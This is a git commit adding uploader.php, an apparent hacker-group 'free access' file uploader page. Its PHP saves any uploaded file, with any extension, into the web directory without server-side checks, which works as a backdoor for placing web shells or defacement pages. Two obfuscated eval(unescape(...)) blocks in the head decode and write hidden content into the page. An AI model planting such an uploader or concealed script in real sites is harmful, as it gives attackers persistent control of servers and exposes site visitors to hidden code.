a0c2d271dbc2a9d421bcad56e20f526cac09fae5
Hellcat Indonesia <60791867+hellcatindonesia@users.noreply.github.com>
2020-02-08 00:59:20 +0700

    Add files via upload

---
+++ uploader.php
@@ -0,0 +1,165 @@
+<!--========================================================
+MO NGAPAIN LU BUJANK?
+IG : @bartes_07
+YT : Free Tutorial
+======================================================== -->
+<!DOCTYPE html>
+<head>
+<meta name="theme-color" content="#333333">
+<meta name="viewport" content="width=400, user-scalable=no">
+<title>Free Akses Uploader | Bartes Dwiky</title>
+<link rel="icon" type="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJVGle-arAu0pdnTeY--royJcpsVLhzyEj_RYJGnRkolUzkNrg7DzyamtiVn1LMBtnG9o5Xw&usqp=CAE&s">
+<meta name="description" content="Bartes Dwiky">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJVGle-arAu0pdnTeY--royJcpsVLhzyEj_RYJGnRkolUzkNrg7DzyamtiVn1LMBtnG9o5Xw&usqp=CAE&s">
+<meta property="og:title" content="Ootopia Indonesia | Uploader">
+<meta property="og:description" content="Free Akses Uploader"/>
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJVGle-arAu0pdnTeY--royJcpsVLhzyEj_RYJGnRkolUzkNrg7DzyamtiVn1LMBtnG9o5Xw&usqp=CAE&s">
+<meta property="og:image:type" content="image/jpeg"/>
+<meta property="og:image:width" content="300" />
+<meta property="og:image:height" content="300" />
+<meta property="fb:app_id" content="1784293148453056" />
+<link href="http://aashirwadtravel.com/favicon.ico" rel="icon" type="image/x-icon"/>
+
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6e%38%61%63%38%36%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%30%38%38%33%33%30%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%30%33%38%32%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%31%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6e%38%61%63%38%36%32%28%27') + '%3f%6b%69%7a%64%79%6f%6a%73%3e%04%0b%3e%68%62%74%68%19%6f%74%76%6f%2f%6c%72%71%6c%73%3b%29%77%6c%62%74%64%71%6f%23%1a%66%68%6a%7b%62%65%74%39%21%2c%32%1d%71%75%6d%3b%6f%75%7b%68%77%39%2d%26%63%65%75%75%63%7a%65%7e%6f%6f%78%2e%6c%76%31%29%68%76%6e%27%17%29%38%0c%0a%33%2c%68%6a%74%65%79%6e%67%74%3810883302%34%36%37%38%36%38%37' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Aldrich&display=swap');
+body{
+font-family: 'Aldrich', sans-serif;
+background-color: #333333;
+background-size: cover;
+color: #1BBAA3;
+text-align:center;
+}
+.gambar{
+width: 50%;
+position: relative;
+top: 30px;
+box-shadow: 0px 0px 15px #1BBAA3; 
+-moz-box-shadow: 0px 0px 15px #1BBAA3;
+-webkit-box-shadow: 0px 0px 15px #1BBAA3;
+border-radius: 30%;
+}
+.posisi{
+position: relative;
+top: 100px;
+text-align: center;
+}
+.input1{
+font-family: 'Aldrich', sans-serif;
+background: transparent;
+border: 2px solid #1BBAA3;
+border-radius: 5px;
+outline:none;
+box-shadow: 0px 0px 15px #1BBAA3; 
+-moz-box-shadow: 0px 0px 15px #1BBAA3;
+-webkit-box-shadow: 0px 0px 15px #1BBAA3;
+}
+.input1:hover{
+box-shadow: 0px 0px 15px red; 
+-moz-box-shadow: 0px 0px 15px red;
+-webkit-box-shadow: 0px 0px 15px red;
+border: 2px solid red;
+color: red;
+}
+.text{
+font-family: 'Aldrich', sans-serif;
+position: relative;
+top: 87px;
+font-size: 10px;
+}
+.button{
+font-family: 'Aldrich', sans-serif;
+outline: none;
+background: transparent;
+width: 30%;
+height: 30px;
+color: #1BBAA3;
+border-radius: 8px;
+border: 2px solid #1BBAA3;
+box-shadow: 0px 0px 15px #1BBAA3; 
+-moz-box-shadow: 0px 0px 15px #1BBAA3;
+-webkit-box-shadow: 0px 0px 15px #1BBAA3;
+}
+.button:hover{
+border: 2px solid red;
+    transform: scale(1.0);
+    color: red;
+box-shadow: 0px 0px 15px red; 
+-moz-box-shadow: 0px 0px 15px red;
+-webkit-box-shadow: 0px 0px 15px red;
+}
+.footer {
+
+  position: fixed;
+   right: 0;
+ border: 2px solid black;
+  bottom: 0;
+  width: 100%;
+  background-color: #333333;
+  color: white;
+box-shadow: 0px 0px 15px black; 
+-moz-box-shadow: 0px 0px 15px black;
+-webkit-box-shadow: 0px 0px 15px black;
+}
+</style>
+<div class="preloader">
+<div class="loader"></div></div>
+
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%72%37%65%39%31%64%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%31%30%33%34%32%36%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%30%31%31%35%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%37%65%39%31%64%32%28%27') + '%3c%6a%5b%66%60%69%79%1a%6f%6f%5e%3c%1c%60%75%74%64%6a%33%22%2d%5e%5c%6f%75%63%6b%65%77%6d%62%70%23%67%71%30%2b%6e%6c%67%2e%74%63%6e%6d%66%2d%71%6d%69%6e%5f%64%64%6a%22%63%6a%17%3c%09%07%39%2e%6d%5b%6b%61%64%75%3f21034269%34%35%34%38%35%35%39' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+</head>
+<body>
+<center>
+<div oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'><img src="logo.png" class="gambar">
+</div>
+<br>
+<div class="text">
+Format : html / htm / txt / jpg / png
+</div>
+</center>
+<div class="posisi">
+<form action='' method='post' id='idf' enctype='multipart/form-data'> 
+<input type='file' name='fup' class='input1' onchange="checkName(this, 'fname','submit')" /><br /><br /> <br /><tt id="fname">
+ <button type='submit' name='up' class='button' id='submit'>Upload</button>
+</form>
+</div>
+</center>
+<div class="footer">
+<p>Instagram: <a href="https://www.instagram.com/bartes_07" style="text-decoration:none; color: #1BBAA3">@Bartes_07</a></p>
+</div>
+</body>
+</html>
+
+<?php
+if(isset($_POST["up"])){
+$file = $_FILES['fup']['name'];
+$namafile = $_FILES['fup']['tmp_name'];
+$dir = "";
+$terupload = move_uploaded_file($namafile, $dir.$file);
+if(file_exists("$namaFile")){
+	echo "<script> alert('Nama file sudah ada :('); </script>";
+}
+else
+{
+if ($terupload) {
+echo "<script> alert('Sukses!'); 
+window.location.href='$file';
+</script>";
+} else {
+    echo "<script> alert('Pilih filenya dulu Tolol!'); </script>";
+}
+}
+}
+?>
